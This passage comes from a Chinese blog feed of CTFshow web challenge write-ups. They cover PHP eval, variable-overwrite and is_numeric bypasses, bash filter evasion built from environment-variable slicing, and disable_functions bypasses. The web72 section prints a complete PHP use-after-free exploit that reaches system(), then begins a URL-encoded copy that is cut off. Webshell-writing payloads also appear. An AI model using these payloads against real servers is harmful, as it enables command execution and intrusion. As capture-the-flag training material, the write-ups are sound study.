object(ReflectionMethod)#2 (2) &#123;    [&quot;name&quot;]&#x3D;&gt;    string(5) &quot;hello&quot;    [&quot;class&quot;]&#x3D;&gt;    string(1) &quot;A&quot;  &#125;&#125;</code></pre><h1 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h1><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);include(&quot;ctfshow.php&quot;);&#x2F;&#x2F;flag in class ctfshow;$ctfshow &#x3D; new ctfshow();$v1&#x3D;$_GET[&#39;v1&#39;];$v2&#x3D;$_GET[&#39;v2&#39;];$v3&#x3D;$_GET[&#39;v3&#39;];$v0&#x3D;is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;  if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\&#x3D;|\&#123;|\[|\&quot;|\&#39;|\,|\.|\;|\?|[0-9]&#x2F;&quot;, $v2))&#123;    if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\&#x3D;|\&#123;|\[|\&quot;|\&#39;|\,|\.|\?|[0-9]&#x2F;&quot;, $v3))&#123;      eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;);    &#125;  &#125;&#125;</code></pre><p>和上个题差不多，也是用反射类解决的。<br><code>?v1=1&amp;v2=echo new Reflectionclass&amp;v3=;</code>，将0x2d替换掉：<br><code>3c1e313c0x2dbfc60x2d49940x2d938b0x2ddd880411ad8</code>&#x3D;》<code>3c1e313c-bfc6-4994-938b-dd880411ad8</code><br>但是flag格式最后一个是12位，因此需要爆破出最一位。<br>0-c一个一个尝试就行。</p><h1 id="web102-isnumeric-and-isnumeric绕过"><a href="#web102-isnumeric-and-isnumeric绕过" class="headerlink" title="web102 isnumeric and isnumeric绕过"></a>web102 isnumeric and isnumeric绕过</h1><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);$v1 &#x3D; $_POST[&#39;v1&#39;];$v2 &#x3D; $_GET[&#39;v2&#39;];$v3 &#x3D; $_GET[&#39;v3&#39;];$v4 &#x3D; is_numeric($v2) and is_numeric($v3);if($v4)&#123;  $s &#x3D; substr($v2,2);  $str &#x3D; call_user_func($v1,$s);  echo $str;  file_put_contents($v3,$str);&#125;else&#123;  die(&#39;hacker&#39;);&#125;?&gt;</code></pre><p>substr() 函数返回字符串的一部分。<br>call_user_func()函数把第一个参数作为回调函数调用<br>file_put_contents() 函数把一个字符串写入文件中。<br>代码分析：v4检测是否进入判断。v2会被删除掉前两个字符，v1调用方法传入删过字符的v2，再将结果写入文件v3。<br>因此核心操作语句在v2。<br>上来有个数字检测，这里要使用hex2bin。<br>php5下is_numeric可识别16进制，如0x2e，然后调用hex2bin转成字符串写入木马，但题目环境没配好，是php7,所以要另换方法。<br>用伪协议写入，所以需要base64编码后转成16进制全是数字的字符串（但是下面这个不行）</p><pre class="language-php" data-language="php"><code class="language-php">$a &#x3D; &quot;&lt;?&#x3D;&#96;cat *&#96;;&gt;&quot;;$b &#x3D; base64_encode($a);$c &#x3D; bin2hex($b);echo $c;</code></pre><p>注意这个上面的不行，因为转换后的hex中除了e有其他的字符，wp中提到了使用的以下这种</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php $a&#x3D;&#39;&lt;?&#x3D;&#96;cat *&#96;;&#39;; $b&#x3D;base64_encode($a);&#x2F;&#x2F;$a&#x3D;PD89YGNhdCAqYDs&#x3D; $c&#x3D;bin2hex(&#39;PD89YGNhdCAqYDs&#39;); echo $c; ?&gt;</code></pre><p>然后生成的hex串：<code>5044383959474e6864434171594473</code>（这里的e会被当作科学计数法）为了绕过截断需要在前面随便加两个字符11，v3使用伪协议执行<br>GET：<code>?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=2.php</code><br>POST传入bin2hex的反函数：<code>v1=hex2bin</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684232663181-750fae44-4eff-4924-a3bd-20e706bf442d.png" alt="image.png"></p><h1 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h1><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);$v1 &#x3D; $_POST[&#39;v1&#39;];$v2 &#x3D; $_GET[&#39;v2&#39;];$v3 &#x3D; $_GET[&#39;v3&#39;];$v4 &#x3D; is_numeric($v2) and is_numeric($v3);if($v4)&#123;    $s &#x3D; substr($v2,2);    $str &#x3D; call_user_func($v1,$s);    echo $str;    if(!preg_match(&quot;&#x2F;.*p.*h.*p.*&#x2F;i&quot;,$str))&#123;        file_put_contents($v3,$str);    &#125;    else&#123;        die(&#39;Sorry&#39;);    &#125;&#125;else&#123;    die(&#39;hacker&#39;);&#125;</code></pre><p>同上题payload</p><h1 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h1><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;    $v1 &#x3D; $_POST[&#39;v1&#39;];    $v2 &#x3D; $_GET[&#39;v2&#39;];    if(sha1($v1)&#x3D;&#x3D;sha1($v2))&#123;        echo $flag;    &#125;&#125;</code></pre><p>get，post全传入1即可，或者传入数组<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684233072751-3de90d66-58b6-48e9-884b-c57c50fb0185.png" alt="image.png"></p><h1 id="web105-a-变量覆盖"><a href="#web105-a-变量覆盖" class="headerlink" title="web105 $$a 变量覆盖"></a>web105 $$a 变量覆盖</h1><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);include(&#39;flag.php&#39;);error_reporting(0);$error&#x3D;&#39;你还想要flag嘛？&#39;;$suces&#x3D;&#39;既然你想要那给你吧！&#39;;foreach($_GET as $key &#x3D;&gt; $value)&#123;    if($key&#x3D;&#x3D;&#x3D;&#39;error&#39;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key&#x3D;$$value;&#125;foreach($_POST as $key &#x3D;&gt; $value)&#123;    if($value&#x3D;&#x3D;&#x3D;&#39;flag&#39;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key&#x3D;$$value;&#125;if(!($_POST[&#39;flag&#39;]&#x3D;&#x3D;$flag))&#123;    die($error);&#125;echo &quot;your are good&quot;.$flag.&quot;\n&quot;;die($suces);</code></pre><p>比赛之前遇到好多次这种题了，但是看了wp也没有很好的学明白，看到了一份wp里面讲的很清楚。<br>采用中间变量来解决：<br><code>error=a=flag</code><br>GET中error不能在等号左边。<br>POST中flag不能在等号右边。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684234987314-7d5c585a-f312-477d-8007-4a4571cdfee2.png" alt="image.png"><br>GET：<code>a=flag</code><br>POST：<code>error=a</code><br>这样就达成了一种情况：<br>首先要知道传入的值是文本，<code>$$key=$$value</code>达成了<code>$a=$flag</code>，后半段同理，<code>$error=$a</code>这样就达成了值桥接。这样文末的判断才会判断为正。<br>看了一眼wp发现一个更牛的做法，直接get传入：<br><code>?suces=flag&amp;flag=</code><br>这就是构造的<code>suces=flag=空</code><br>后面的默认传入flag就是空对应到flag。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web118-web122+web124命令执行篇（四）</title>
      <link href="/posts/e63f4b1d/"/>
      <url>/posts/e63f4b1d/</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考链接：</p><p><a href="https://blog.csdn.net/weixin_46081055/article/details/121721209">https://blog.csdn.net/weixin_46081055&#x2F;article&#x2F;details&#x2F;121721209</a></p></blockquote><h1 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h1><p>题目里面提示了：<code>flag in flag.php</code><br>随便提交一点东西，看到源代码中：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681292185940-62d08e5c-aa0a-41fd-99f7-c0d5ba3983e7.png" alt="image.png"><br>post上传然后system执行，但是没有回显。<br>但是输入会出现evil input，因此想到可能是有过滤。<br>fuzz一下：<br>发现有的字符被过滤掉了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681292787888-6d27b5da-8902-4aae-8a8e-9f2a0bcbd28d.png" alt="image.png"><br>剩余的字符有<code>A-Z</code>，<code>;:&#123;&#125;?#$_,@~</code><br>看了wp学了一个新姿势：以下是在本地测试的。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681293462939-5380ccaf-846d-4c6b-8101-368008933c8a.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681293528467-e3e58553-e477-4503-9732-83c32cda2250.png" alt="image.png"><br>我们到web测试一下：<br>web上的用户名末尾为l，path末尾为n，因此我们可以尝试组合：</p><pre class="language-php" data-language="php"><code class="language-php">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$IFS????.???</code></pre><p>组合成为nl查找文件。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681294107237-9cb838b1-54a0-4bcf-8595-27aff96f8054.png" alt="image.png"><br>当然也有使用别的字段的方法：</p><pre class="language-none"><code class="language-none">SHLVL是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时$&#123;SHLVL&#125;&#x3D;1，然后在此shell中再打开一个shell时$&#123;SHLVL&#125;&#x3D;2。$&#123;PWD:$&#123;#&#125;:$&#123;SHLVL&#125;&#125;就输出&#x2F;$&#123;#&#125;是0，$&#123;SHLVL&#125;为1$&#123;#PWD&#125;是回显字符数，$&#123;PWD&#125; 是&#x2F;root，$&#123;#PWD&#125;是5</code></pre><pre class="language-none"><code class="language-none">#$&#123;RANDOM&#125;是随机数，$&#123;#RANDOM&#125;一般是5，也可能是4$&#123;PATH:$&#123;#HOME&#125;:$&#123;#SHLVL&#125;&#125;$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125; ?$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125;??.???#其他师傅$&#123;PATH:~A&#125;$&#123;PATH:$&#123;#TERM&#125;:$&#123;SHLVL:~A&#125;&#125; ????.???</code></pre><h1 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h1><p>这道题把<code>$&#123;PATH&#125;</code>给禁用了。因此我们需要想出其他解法。<br>payload：</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???# pwd&#x3D;&#x2F;var&#x2F;www&#x2F;html# USER&#x3D;www-data# payload即为 &#x2F;???&#x2F;?at ????.???为了构造&#x2F;bin&#x2F;cat </code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681311550803-b62629a3-be2a-45fa-b3ff-1969672a8348.png" alt="image.png"><br>也可以只要a进行构造</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???&#x2F;???&#x2F;?a? ????.???</code></pre><p>这两个查看的时候都需要打开f12查看。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681311675416-57a9681f-d78b-491f-bc98-44afa1576ad2.png" alt="image.png"></p><h1 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h1><p>fuzz一下看看剩余什么可用字符：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php  &#x2F;&#x2F;fuzz一下看看剩余什么字符  for($i &#x3D; 33; $i &lt;&#x3D; 126; $i++)&#123;  if(!preg_match(&quot;&#x2F;\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\&#x2F;|\(|\)|\[|\]|\\\\|\+|\-|\!|\&#x3D;|\^|\*|\x26|\%|\&lt;|\&gt;|\&#39;|\&quot;|\&#96;|\||\,&#x2F;&quot;, chr($i)))&#123;  echo chr($i);  &#125;  &#125;?&gt;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681312167771-8de604f0-ffaf-4aa5-850f-4e1bef1d02dc.png" alt="image.png"><br>剩余：<code>#$.:;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ_&#123;&#125;~</code><br>通过观察，应该是还是用上一道题类似的方法。但是这次过滤了PATH|BASH|HOME三个字段。<br>所以构建payload：</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???&#x2F;???&#x2F;?a? ????.???</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681312602829-4b269e50-195a-4a00-a726-94d2b1eda48c.png" alt="image.png"></p><h1 id="web121"><a href="#web121" class="headerlink" title="web121"></a>web121</h1><pre class="language-powershell" data-language="powershell"><code class="language-powershell">&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#39;code&#39;]))&#123;    $code&#x3D;$_POST[&#39;code&#39;];    if(!preg_match(&#39;&#x2F;\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\&#x2F;|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\&#x3D;|\^|\*|\x26|\%|\&lt;|\&gt;|\&#39;|\&quot;|\&#96;|\||\,&#x2F;&#39;, $code))&#123;            if(strlen($code)&gt;65)&#123;            echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.&#39;you are so long , I dont like &#39;.&#39;&lt;&#x2F;div&gt;&#39;;        &#125;        else&#123;        echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.system($code).&#39;&lt;&#x2F;div&gt;&#39;;        &#125;    &#125;    else&#123;     echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;evil input&lt;&#x2F;div&gt;&#39;;    &#125;&#125;?&gt;</code></pre><p>比上一题过滤更加严密，把<code>FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME</code>都过滤掉了。<br>好像把<code>$&#123;PWD&#125;</code>留下了。</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">code&#x3D;$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;?? ????.???&#x2F;???&#x2F;r?? ????.???&#x2F;bin&#x2F;rev</code></pre><p>&#96;${?}&#x3D;0，$</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web58-77命令执行篇（三）</title>
      <link href="/posts/a20f5212/"/>
      <url>/posts/a20f5212/</url>
      
        <content type="html"><![CDATA[<h1 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h1><pre class="language-php" data-language="php"><code class="language-php">if(isset($_POST[&#39;c&#39;]))&#123;  $c&#x3D; $_POST[&#39;c&#39;];  eval($c);&#125;else&#123;  highlight_file(__FILE__);&#125;</code></pre><p>正常来说，看到这个格式，我们第一个想到的就是使用system然后命令执行，但是当我们尝试使用时会发现：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680188042126-c8349447-3fd5-476b-9f44-6882c1d58843.png" alt="image.png"><br>这是因为php.ini配置中默认禁用了执行系统外部命令函数，但是这里我们可以用php内置函数来读取文件，因此这部分学习的时php相关函数的使用。<br>我们需要先查看当前目录。<code>c=print_r(glob(&quot;*&quot;));</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680188390551-ccd0bc7e-f319-48f4-9048-e9709fe4a367.png" alt="image.png"><br>或者<code>c=print_r(scandir(&#39;.&#39;));</code>（注意两者的返回数组内容不同）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680188668314-11508ec5-a9c6-4805-a743-2b89641beb78.png" alt="image.png"><br>我们直接显示代码就行。<br>post传参，<code>c=highlight_file(&#39;flag.php&#39;);</code>或者<code>show_source(__FILE__);</code></p><h1 id="web59-65"><a href="#web59-65" class="headerlink" title="web59-65"></a>web59-65</h1><p>题可能出错了，和58一模一样…</p><h1 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h1><pre class="language-php" data-language="php"><code class="language-php">if(isset($_POST[&#39;c&#39;]))&#123;  $c&#x3D; $_POST[&#39;c&#39;];  eval($c);&#125;else&#123;  highlight_file(__FILE__);&#125;</code></pre><p>show_source被禁用，highlight_file查看flag.php文件提示不在这里。<br>那么查看根目录文件发现flag.txt。<code>c=var_dump(scandir(&#39;/&#39;));</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680189387199-0ce00bd0-0d23-44e5-a511-2f3e9b96f24b.png" alt="image.png"><br>直接用highlight_file读文件。<code>c=highlight_file(&#39;/flag.txt&#39;);</code></p><h1 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h1><p>禁用了print_r<br><code>var_dump(scandir(&#39;/&#39;));</code><br><code>c=highlight_file(&#39;/flag.txt&#39;);</code></p><h1 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h1><p>把highlight_file禁用了。但是其他的还可以用。<br><code>var_dump(scandir(&#39;/&#39;));</code>查看根目录文件。<br>我们还可以使用include、require函数来阅读文件：<code>require(&#39;/flag.txt&#39;);</code></p><h1 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h1><p>var_dump被禁用，但是google了一下类似函数，发现了<code>var_export</code>函数功能类似。<br><code>c=var_export(scandir(&#39;/&#39;));</code><br>读取根目录下文件。<code>require(&#39;/flag.txt&#39;);</code></p><h1 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h1><p><code>c=var_export(scandir(&#39;/&#39;));</code><br><code>require(&#39;/flag.txt&#39;);</code></p><h1 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h1><p>尝试读取根目录：<code>c=var_export(scandir(&#39;/&#39;));</code>但是发现出现如下情况：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680191189835-ec426ee9-4d83-4d74-b321-79bbe39b0de7.png" alt="image.png"><br>经过查询发现，这是php对缓冲区进行操作导致的。</p><blockquote><p><a href="https://blog.csdn.net/weixin_39938855/article/details/115944594">https://blog.csdn.net/weixin_39938855&#x2F;article&#x2F;details&#x2F;115944594</a></p></blockquote><p>查看index.php后发现</p><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);ini_set(&#39;display_errors&#39;, 0);&#x2F;&#x2F; 你们在炫技吗？if(isset($_POST[&#39;c&#39;]))&#123;        $c&#x3D; $_POST[&#39;c&#39;];        eval($c);        $s &#x3D; ob_get_contents();        ob_end_clean();        echo preg_replace(&quot;&#x2F;[0-9]|[a-z]&#x2F;i&quot;,&quot;?&quot;,$s);&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p>原理就是ob_get_contents()和ob_end_clean();的执行，我们想办法让他后面的部分不执行即可，那么我们对payload后面加上<code>exit(0)</code>截断即可（或者die函数）<br><code>c=var_export(scandir(&#39;/&#39;));die(1);</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680191595296-540d251d-7abb-47f6-9f07-1ea8ef6685b7.png" alt="image.png"><br>这样文本就正常了。<br><code>require(&#39;/flag.txt&#39;);</code></p><h1 id="web72"><a href="#web72" class="headerlink" title="*web72"></a>*web72</h1><p>scandir函数被禁止了。</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);ini_set(&#39;display_errors&#39;, 0);&#x2F;&#x2F; 你们在炫技吗？if(isset($_POST[&#39;c&#39;]))&#123;        $c&#x3D; $_POST[&#39;c&#39;];        eval($c);        $s &#x3D; ob_get_contents();        ob_end_clean();        echo preg_replace(&quot;&#x2F;[0-9]|[a-z]&#x2F;i&quot;,&quot;?&quot;,$s);&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p>让我们看看wp是怎么解的吧。（水平一下又拔起来了。。。）<br>利用php脚本读取文件目录：（利用glob:&#x2F;&#x2F;伪协议绕过open_basedir）</p><pre class="language-php" data-language="php"><code class="language-php">c&#x3D;?&gt;&lt;?php $a&#x3D;new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125;exit(0);?&gt;</code></pre><p><strong>这是访问根目录，如果想要访问网站目录为（相对路径）：</strong><code>**&quot;glob://./*&quot;**</code><br>因为scandir这些简单函数被禁用了，就需要我们手写函数来输出。<br>发现目录下有flag0.txt，那么直接尝试require来读取。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680271902026-3d23f6a9-a78f-4a2f-a7c2-7e5ed8084dc7.png" alt="image.png"><br>但是发现这些读取函数被禁用了，没有读取权限。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680271990810-7fa1a783-940b-48f6-8ef4-f07133f5c45e.png" alt="image.png"><br>uaf绕过open_basedir执行命令<br>poc（需要url编码）</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpfunction ctfshow($cmd) &#123;    global $abc, $helper, $backtrace;    class Vuln &#123;        public $a;        public function __destruct() &#123;             global $backtrace;             unset($this-&gt;a);            $backtrace &#x3D; (new Exception)-&gt;getTrace();            if(!isset($backtrace[1][&#39;args&#39;])) &#123;                $backtrace &#x3D; debug_backtrace();            &#125;        &#125;    &#125;    class Helper &#123;        public $a, $b, $c, $d;    &#125;    function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8) &#123;        $address &#x3D; 0;        for($j &#x3D; $s-1; $j &gt;&#x3D; 0; $j--) &#123;            $address &lt;&lt;&#x3D; 8;            $address |&#x3D; ord($str[$p+$j]);        &#125;        return $address;    &#125;    function ptr2str($ptr, $m &#x3D; 8) &#123;        $out &#x3D; &quot;&quot;;        for ($i&#x3D;0; $i &lt; $m; $i++) &#123;            $out .&#x3D; sprintf(&quot;%c&quot;,($ptr &amp; 0xff));            $ptr &gt;&gt;&#x3D; 8;        &#125;        return $out;    &#125;    function write(&amp;$str, $p, $v, $n &#x3D; 8) &#123;        $i &#x3D; 0;        for($i &#x3D; 0; $i &lt; $n; $i++) &#123;            $str[$p + $i] &#x3D; sprintf(&quot;%c&quot;,($v &amp; 0xff));            $v &gt;&gt;&#x3D; 8;        &#125;    &#125;    function leak($addr, $p &#x3D; 0, $s &#x3D; 8) &#123;        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak &#x3D; strlen($helper-&gt;a);        if($s !&#x3D; 8) &#123; $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1; &#125;        return $leak;    &#125;    function parse_elf($base) &#123;        $e_type &#x3D; leak($base, 0x10, 2);        $e_phoff &#x3D; leak($base, 0x20);        $e_phentsize &#x3D; leak($base, 0x36, 2);        $e_phnum &#x3D; leak($base, 0x38, 2);        for($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123;            $header &#x3D; $base + $e_phoff + $i * $e_phentsize;            $p_type  &#x3D; leak($header, 0, 4);            $p_flags &#x3D; leak($header, 4, 4);            $p_vaddr &#x3D; leak($header, 0x10);            $p_memsz &#x3D; leak($header, 0x28);            if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123;                 $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr;                $data_size &#x3D; $p_memsz;            &#125; else if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123;                 $text_size &#x3D; $p_memsz;            &#125;        &#125;        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    &#125;    function get_basic_funcs($base, $elf) &#123;        list($data_addr, $text_size, $data_size) &#x3D; $elf;        for($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123;            $leak &#x3D; leak($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref &#x3D; leak($leak);                                if($deref !&#x3D; 0x746e6174736e6f63)                    continue;            &#125; else continue;            $leak &#x3D; leak($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref &#x3D; leak($leak);                                if($deref !&#x3D; 0x786568326e6962)                    continue;            &#125; else continue;            return $data_addr + $i * 8;        &#125;    &#125;    function get_binary_base($binary_leak) &#123;        $base &#x3D; 0;        $start &#x3D; $binary_leak &amp; 0xfffffffffffff000;        for($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123;            $addr &#x3D; $start - 0x1000 * $i;            $leak &#x3D; leak($addr, 0, 7);            if($leak &#x3D;&#x3D; 0x10102464c457f) &#123;                return $addr;            &#125;        &#125;    &#125;    function get_system($basic_funcs) &#123;        $addr &#x3D; $basic_funcs;        do &#123;            $f_entry &#x3D; leak($addr);            $f_name &#x3D; leak($f_entry, 0, 6);            if($f_name &#x3D;&#x3D; 0x6d6574737973) &#123;                return leak($addr + 8);            &#125;            $addr +&#x3D; 0x20;        &#125; while($f_entry !&#x3D; 0);        return false;    &#125;    function trigger_uaf($arg) &#123;        $arg &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);        $vuln &#x3D; new Vuln();        $vuln-&gt;a &#x3D; $arg;    &#125;    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;        die(&#39;This PoC is for *nix systems only.&#39;);    &#125;    $n_alloc &#x3D; 10;     $contiguous &#x3D; [];    for($i &#x3D; 0; $i &lt; $n_alloc; $i++)        $contiguous[] &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);    trigger_uaf(&#39;x&#39;);    $abc &#x3D; $backtrace[1][&#39;args&#39;][0];    $helper &#x3D; new Helper;    $helper-&gt;b &#x3D; function ($x) &#123; &#125;;    if(strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123;        die(&quot;UAF failed&quot;);    &#125;    $closure_handlers &#x3D; str2ptr($abc, 0);    $php_heap &#x3D; str2ptr($abc, 0x58);    $abc_addr &#x3D; $php_heap - 0xc8;    write($abc, 0x60, 2);    write($abc, 0x70, 6);    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj &#x3D; str2ptr($abc, 0x20);    $binary_leak &#x3D; leak($closure_handlers, 8);    if(!($base &#x3D; get_binary_base($binary_leak))) &#123;        die(&quot;Couldn&#39;t determine binary base address&quot;);    &#125;    if(!($elf &#x3D; parse_elf($base))) &#123;        die(&quot;Couldn&#39;t parse ELF header&quot;);    &#125;    if(!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123;        die(&quot;Couldn&#39;t get basic_functions address&quot;);    &#125;    if(!($zif_system &#x3D; get_system($basic_funcs))) &#123;        die(&quot;Couldn&#39;t get zif_system address&quot;);    &#125;    $fake_obj_offset &#x3D; 0xd0;    for($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123;        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    &#125;    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4);     write($abc, 0xd0 + 0x68, $zif_system);     ($helper-&gt;b)($cmd);    exit();&#125;ctfshow(&quot;cat &#x2F;flag0.txt&quot;);ob_end_flush();?&gt;</code></pre><p>于是payload就是：</p><pre class="language-php" data-language="php"><code class="language-php">c&#x3D;function%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B&#39;args&#39;%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%